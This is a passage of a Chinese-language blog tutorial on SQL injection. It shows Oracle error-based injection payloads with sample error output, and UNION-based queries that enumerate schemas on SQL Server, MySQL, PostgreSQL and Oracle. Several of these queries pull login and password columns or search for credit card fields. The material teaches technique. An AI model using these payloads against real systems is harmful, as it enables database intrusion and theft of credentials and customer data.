r<span class=\"token operator\">=</span><span class=\"token number\">2</span>\nORA<span class=\"token operator\">-</span><span class=\"token number\">29257</span>: host SYSTEM<span class=\"token operator\">=</span>E45049312A231FD1 unknown<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>绕过单行限制以获取多行信息。可通过使用带XML的专用SQL语句或专用的Oracle函数stragg(11g+)来在单行中获取所有行,上述两种方法唯一的限制是输出大小(最大为 4000字节)：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> xmltransform<span class=\"token punctuation\">(</span>sys_xmlagg<span class=\"token punctuation\">(</span>sys_xmlgen<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>xmltype<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;?xml version=\"l.0\"?&gt;&lt;xsl:stylesheet version=\"l.0\"\nxmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:template match:\"/\"&gt;&lt;xsl:for-each select=\"/ROWSET/USERNAME\"&gt;&lt;xsl:value-of select=\"text()\"/&gt;;&lt;/xsl:for-each&lt;/xsl:template &lt;/xsl:stylesheet&gt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>getstringval<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> listagg <span class=\"token keyword\">from</span> all_users<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">select</span> sys<span class=\"token punctuation\">.</span>stragg<span class=\"token punctuation\">(</span><span class=\"token keyword\">distinct</span> username<span class=\"token operator\">||</span><span class=\"token string\">';'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> all_users<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>这段代码注入utl_inaddr中，就会输出所有用户名：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">ALEX<span class=\"token punctuation\">;</span>ANONYMOUS<span class=\"token punctuation\">;</span>APEX_PUBLIC_USER<span class=\"token punctuation\">;</span>CTXSYS<span class=\"token punctuation\">;</span>DBSNMP<span class=\"token punctuation\">;</span>DEMO1<span class=\"token punctuation\">;</span>DIP<span class=\"token punctuation\">;</span>DUMMY<span class=\"token punctuation\">;</span>\nEXFSYS<span class=\"token punctuation\">;</span>FLOWS_030000<span class=\"token punctuation\">;</span>FLOWS_FILES<span class=\"token punctuation\">;</span>MDDATA<span class=\"token punctuation\">;</span>MDSYS<span class=\"token punctuation\">;</span>MGMT_VIEW<span class=\"token punctuation\">;</span>\nMONODEMO<span class=\"token punctuation\">;</span>OLAPSYS<span class=\"token punctuation\">;</span>ORACLE_OCM<span class=\"token punctuation\">;</span>ORDPLUGINS<span class=\"token punctuation\">;</span>ORDSYS<span class=\"token punctuation\">;</span>OUTLN<span class=\"token punctuation\">;</span>\nOWBSYS<span class=\"token punctuation\">;</span>PHP<span class=\"token punctuation\">;</span>PLSQL<span class=\"token punctuation\">;</span>SCOTT<span class=\"token punctuation\">;</span>SI_INFORMTN_SCHEMA<span class=\"token punctuation\">;</span>SPATIAL_CSW_ADMIN_USR<span class=\"token punctuation\">;</span>\nSPATIAL_WFS_ADMIN_USR<span class=\"token punctuation\">;</span>SYS<span class=\"token punctuation\">;</span>SYSMAN<span class=\"token punctuation\">;</span>SYSTEM<span class=\"token punctuation\">;</span>TSMSYS<span class=\"token punctuation\">;</span>WKPROXY<span class=\"token punctuation\">;</span>WKSYS<span class=\"token punctuation\">;</span>\nWK_TEST<span class=\"token punctuation\">;</span>WMSYS<span class=\"token punctuation\">;</span>X<span class=\"token punctuation\">;</span>XDB<span class=\"token punctuation\">;</span>XS<span class=\"token variable\">$NULL</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>默认情况下，oracle llg通过ACL来限制对utl_inaddr和其他网络包访问，这时会得到报错network access denied by access control list，这种情况或者utl_inaddr取消了public权限，就要另外用其他函数了，下面列举函数</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#注入下列内容:</span>\nOr <span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span>ORDSYS.ORD_DICOM.GETMAPPINGXPATH<span class=\"token punctuation\">(</span>user,<span class=\"token string\">'a'</span>,<span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span>-- \n<span class=\"token comment\">#返回下列内容：</span>\nORA-53044: invalid tag: VICTIMUSER\n<span class=\"token comment\">#注入下列内容：</span>\nor <span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span>SYS.DBMS_AW_XML.READAWMETADATA<span class=\"token punctuation\">(</span>user,<span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>-- \n<span class=\"token comment\">#返回下列内容：</span>\nORA-29532: Java call terminated by uncaught Java exception: oracle.\nAWXML.AWException: oracle.AWXML.AWException: An error has occurred, on the server\nError class: Express Failure\nServer error descriptions:\nENG: ORA-34344: Analytic workspace VICTIMUSER is not attached.\n<span class=\"token comment\">#注入下列内容：</span>\nOr <span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span> CTXSYS.CTX_QUERY.CHK_XPATH<span class=\"token punctuation\">(</span>user,<span class=\"token string\">'a'</span>,<span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span>--\n返回下列内容：\nORA-20000: Oracle Text error:\nDRG-11701: thesaurus VICTIMUSER does not exist\nORA-06512: at <span class=\"token string\">\"CTXSYS.DRUE\"</span>, line <span class=\"token number\">160</span>\nORA-06512: at <span class=\"token string\">\"CTXSYS.DRITHSX\"</span>, line <span class=\"token number\">538</span>\nORA-06512: at line <span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"枚举数据库模式\"><a href=\"#枚举数据库模式\" class=\"headerlink\" title=\"枚举数据库模式\"></a>枚举数据库模式</h3><p>在拥有权限的前提下，将所有元数据全部枚举出来</p>\n<h4 id=\"SQL-Server\"><a href=\"#SQL-Server\" class=\"headerlink\" title=\"SQL Server\"></a>SQL Server</h4><p>有一个返回指定商品的详细信息的页面<code>http://test</code></p>\n<p>返回数据表列表</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test?id=12+union+select+null,name,null,null+from+master..sysdatabases</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>master数据库包含了其他数据库的元数据，如master..sysdatabases可以检索出数据库名称列表</p>\n<p>e-shop数据库包含了电子商务应用使用的所有数据。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> db_name<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- 正在使用的数据库名称</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>枚举表名，每个数据都有一个名为<code>sysobjects</code>的表，假如想要检索e-shop数据库的表名</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> name <span class=\"token keyword\">FROM</span> e<span class=\"token operator\">-</span>shop<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>sysobjects <span class=\"token keyword\">WHERE</span> xtype<span class=\"token operator\">=</span><span class=\"token string\">'U'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>得到表名，枚举列名，以customers表为例</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> name <span class=\"token keyword\">FROM</span> e<span class=\"token operator\">-</span>shop<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>syscolumns <span class=\"token keyword\">WHERE</span> id <span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> id <span class=\"token keyword\">FROM</span> e<span class=\"token operator\">-</span>shop<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>sysobjects <span class=\"token keyword\">WHERE</span> name <span class=\"token operator\">=</span> <span class=\"token string\">'customers'</span><span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这句SQL用的是镶嵌查询，先用里面的查出customers表的id，再通过id指定表查列名，也能使用连接查询</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> a<span class=\"token punctuation\">.</span>name <span class=\"token keyword\">FROM</span> e<span class=\"token operator\">-</span>shop<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>syscolumns a<span class=\"token punctuation\">,</span>e_shop<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>sysobjects b <span class=\"token keyword\">WHERE</span>\nb<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span><span class=\"token string\">'customers'</span> <span class=\"token operator\">AND</span> a<span class=\"token punctuation\">.</span>id <span class=\"token operator\">=</span> b<span class=\"token punctuation\">.</span>id<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>知道了列名，可以开始枚举字段，爆数据了，数据类型的检验前面说过</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test?id=12+union+select+null,login,password, null+from+e-shop..Customers-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>防暴力破解scrypt算法</p>\n<h4 id=\"Mysql\"><a href=\"#Mysql\" class=\"headerlink\" title=\"Mysql\"></a>Mysql</h4><p>提取数据库名称, 然后转向表、列，最后是数据本身。</p>\n<p>检索用户</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">select</span> current_users<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>没有管理员权限，大于5.0的版本能用information_schema，获取数据库名列表</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token keyword\">schema</span> form information_schema<span class=\"token punctuation\">.</span>schemata<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>枚举表名，库名customers_db</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> table_schema<span class=\"token punctuation\">,</span>table_name <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">WHERE</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">'customers_db'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>枚举所有表名</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> table_schema<span class=\"token punctuation\">,</span>table_name <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">WHERE</span> table_schema <span class=\"token operator\">!=</span> <span class=\"token string\">'mysql'</span> <span class=\"token operator\">AND</span> table_schema <span class=\"token operator\">!=</span> <span class=\"token string\">'information_schema'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>检索列</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> table_schema<span class=\"token punctuation\">,</span>table_name<span class=\"token punctuation\">,</span>column_name <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">WHERE</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">'test'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>全部列</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> table_schema<span class=\"token punctuation\">,</span>table_name<span class=\"token punctuation\">,</span>column_name <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">WHERE</span> table_schema <span class=\"token operator\">!=</span> <span class=\"token string\">'mysql'</span> <span class=\"token operator\">AND</span> table_schema <span class=\"token operator\">!=</span> <span class=\"token string\">'information_schema'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这样就可以爆出数据库全部内容，当然你能加一些限制条件，找到你需要的数据</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> table_schema<span class=\"token punctuation\">,</span>table_name<span class=\"token punctuation\">,</span>column_name <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">WHERE</span> column_name <span class=\"token operator\">LIKE</span> <span class=\"token string\">'password'</span> <span class=\"token operator\">OR</span> column_name <span class=\"token operator\">LIKE</span> <span class=\"token string\">'credit_card'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>查询用户授权信息</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> grantee<span class=\"token punctuation\">,</span>privilege_type<span class=\"token punctuation\">,</span>is_grantable <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span>user_privileges<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>5.0之前的数据库</p>\n<p>先访问存储目标数据库的文件，将其原始内容导入到我们创建的一张表中，然后使用前面介绍的技术提取该表。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>数据库的文件保存在与数据库名称相同的目录下。此目录包含在主MySQL数据目录中，可使用下列查询来返回该目录：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> @<span class=\"token variable\">@datadir</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>数据库的所有表包含在一个扩展名为MYD的文件中。例如，下面是数据库默认的 一些MYD文件：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">tables_priv.MYD\nhost.MYD\nhelp_keyword.MYD\ncolumns_priv.MYD\ndb.MYD<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可使用下列查询提取该数据库中特定表的内容：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'databasename/tablename.MYD'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>要是没有information_schema,就必须先暴力破解表名后才能成功执行该查询。load_file允许检索的字节数有个最大值，该值由<code>@@max_allowed_packet</code> 变量指定。所以该技术不适用于存储了大量数据的表。</p>\n<h4 id=\"PostgreSQL-1\"><a href=\"#PostgreSQL-1\" class=\"headerlink\" title=\"PostgreSQL\"></a>PostgreSQL</h4><p>检索所有数据库</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> datname <span class=\"token keyword\">FROM</span> pg_database<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>查找当前数据库</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> current_database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>检索数据库用户列表</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> usename <span class=\"token keyword\">from</span> pg_user<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>查询当前用户</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">user</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">current_user</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">session_user</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">SELECT</span> getpgusername<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>session_user返回启动当前数据库连接的用户，而current_user和user(二者是等价的)则返回当前执行上下文的用户，即返回用于检查许可权限的那个用户账号。除非在某处调用了 SET ROLE指令，否则二者通常返回相同的值。对于最后一条语句，getpgusername()将返回与当前线程关联的用户。</p>\n<p>枚举所有模式中的全部表</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> c<span class=\"token punctuation\">.</span>relname <span class=\"token keyword\">FROM</span> pg_catalog<span class=\"token punctuation\">.</span>pg_class c <span class=\"token keyword\">LEFT</span> <span class=\"token keyword\">JOIN</span> pg_catalog<span class=\"token punctuation\">.</span>pg_namespace n <span class=\"token keyword\">ON</span> n<span class=\"token punctuation\">.</span>oid <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span>relnamespace <span class=\"token keyword\">WHERE</span> c<span class=\"token punctuation\">.</span>relkind <span class=\"token operator\">IN</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> n<span class=\"token punctuation\">.</span>nspname <span class=\"token operator\">NOT</span> <span class=\"token operator\">IN</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'pg_catalog'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'pg_toast'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> pg_catalog<span class=\"token punctuation\">.</span>pg_table_is_visible<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>oid<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">SELECT</span> tablename <span class=\"token keyword\">FROM</span> pg_tables <span class=\"token keyword\">WHERE</span> tablename <span class=\"token operator\">NOT</span> <span class=\"token operator\">LIKE</span> <span class=\"token string\">'pg_%'</span> <span class=\"token operator\">AND</span> tablename <span class=\"token operator\">NOT</span> <span class=\"token operator\">LIKE</span> <span class=\"token string\">'sql_%'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>所有列(public下的)</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> relname<span class=\"token punctuation\">,</span>A<span class=\"token punctuation\">.</span>attname <span class=\"token keyword\">FROM</span> pg_class C<span class=\"token punctuation\">,</span>pg_namespace N<span class=\"token punctuation\">,</span>pg_attribute A<span class=\"token punctuation\">,</span>pg_type T <span class=\"token keyword\">WHERE</span> <span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">.</span>relkind<span class=\"token operator\">=</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">.</span>oid<span class=\"token operator\">=</span>C<span class=\"token punctuation\">.</span>relnamespace<span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">.</span>attrelid<span class=\"token operator\">=</span>C<span class=\"token punctuation\">.</span>oid<span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">.</span>atttypid<span class=\"token operator\">=</span>T<span class=\"token punctuation\">.</span>oid<span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">.</span>attnum<span class=\"token operator\">&gt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">NOT</span> A<span class=\"token punctuation\">.</span>attisdropped<span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">.</span>nspname <span class=\"token operator\">ILIKE</span> <span class=\"token string\">'public'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>passwd列</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> relname<span class=\"token punctuation\">,</span>A<span class=\"token punctuation\">.</span>attname <span class=\"token keyword\">FROM</span> pg_class C<span class=\"token punctuation\">,</span>pg_namespace N<span class=\"token punctuation\">,</span>pg_attribute A<span class=\"token punctuation\">,</span>pg_type T <span class=\"token keyword\">WHERE</span> <span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">.</span>relkind<span class=\"token operator\">=</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">.</span>oid<span class=\"token operator\">=</span>C<span class=\"token punctuation\">.</span>relnamespace<span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">.</span>attrelid<span class=\"token operator\">=</span>C<span class=\"token punctuation\">.</span>oid<span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">.</span>atttypid<span class=\"token operator\">=</span>T<span class=\"token punctuation\">.</span>oid<span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">.</span>attnum<span class=\"token operator\">&gt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">NOT</span> A<span class=\"token punctuation\">.</span>attisdropped<span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">.</span>nspname <span class=\"token operator\">ILIKE</span> <span class=\"token string\">'public'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span>\nattname <span class=\"token operator\">LIKE</span> <span class=\"token string\">'%passwd%'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"Oracle\"><a href=\"#Oracle\" class=\"headerlink\" title=\"Oracle\"></a>Oracle</h4><p>无法枚举存在的数据库</p>\n<p>枚举所有属于当前用户的表</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> user_tables<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>枚举所有表和表的拥有者</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> owner<span class=\"token punctuation\">,</span>table_name <span class=\"token keyword\">from</span> all_tables<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>枚举更多关于应用表的信息以确定表中出现的列数和行数</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> a<span class=\"token punctuation\">.</span>table_name<span class=\"token operator\">||</span><span class=\"token string\">'['</span><span class=\"token operator\">||</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token string\">']='</span><span class=\"token operator\">||</span>num_rows <span class=\"token keyword\">from</span> user_tab_columns a<span class=\"token punctuation\">,</span>user_tables b <span class=\"token keyword\">where</span> a<span class=\"token punctuation\">.</span>table_name<span class=\"token operator\">=</span>b<span class=\"token punctuation\">.</span>table_name <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span>\na<span class=\"token punctuation\">.</span>table_name<span class=\"token punctuation\">,</span>num_rows\n\nEMP<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">14</span>\n<span class=\"token keyword\">DUMMY</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>\nDEPT<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">4</span>\nSALGRADE<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">5</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>为所有可访问或可用的表枚举相同的信息，包括用户、表名以及表中包含的行数</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> b<span class=\"token punctuation\">.</span>owner<span class=\"token operator\">||</span><span class=\"token string\">'.'</span><span class=\"token operator\">||</span>a<span class=\"token punctuation\">.</span>table_name<span class=\"token operator\">||</span><span class=\"token string\">'['</span><span class=\"token operator\">||</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token string\">']='</span><span class=\"token operator\">||</span>num_rows <span class=\"token keyword\">from</span> all_tab_columns a<span class=\"token punctuation\">,</span>all_tables b <span class=\"token keyword\">where</span> a<span class=\"token punctuation\">.</span>table_name<span class=\"token operator\">=</span>b<span class=\"token punctuation\">.</span>table_name <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> b<span class=\"token punctuation\">.</span>owner<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">.</span>table_name<span class=\"token punctuation\">,</span>num_rows<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>枚举每张表的列和数据类型以便更完整地了解数据库模式</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> table_name<span class=\"token operator\">||</span><span class=\"token string\">':'</span><span class=\"token operator\">||</span>column_name<span class=\"token operator\">||</span><span class=\"token string\">':'</span><span class=\"token operator\">||</span>data_type<span class=\"token operator\">||</span><span class=\"token string\">':'</span><span class=\"token operator\">||</span>column_id <span class=\"token keyword\">from</span> user_tab_columns <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> table_name<span class=\"token punctuation\">,</span>column_id\n\nDEPT:DEPTNO:NUMBER:<span class=\"token number\">1</span>\nDEPT:DNAME:VARCHAR2:<span class=\"token number\">2</span>\nDEPT:LOC:VARCHAR2:<span class=\"token number\">3</span>\n<span class=\"token keyword\">DUMMY</span>:<span class=\"token keyword\">DUMMY</span>:NUMBER:<span class=\"token number\">1</span>\nEMP:EMPNO:NUMBER:<span class=\"token number\">1</span>\nEMP:ENAME:VARCHAR2:<span class=\"token number\">2</span>\nEMP:JOB:VARCHAR2:<span class=\"token number\">3</span>\nEMP:MGR:NUMBER:<span class=\"token number\">4</span>\nEMP:HIREDATE:<span class=\"token keyword\">DATE</span>:<span class=\"token number\">5</span>\nEMP:SAL:NUMBER:<span class=\"token number\">6</span>\nEMP:COMM:NUMBER:<span class=\"token number\">7</span>\nEMP:DEPTNO:NUMBER:<span class=\"token number\">8</span>\nSALGRADE:GRADE:NUMBER:<span class=\"token number\">1</span>\nSALGRADE:LOSAL:NUMBER:<span class=\"token number\">2</span>\nSALGRADE:HISAL:NUMBER:<span class=\"token number\">3</span><span aria-hidden=\"true\" 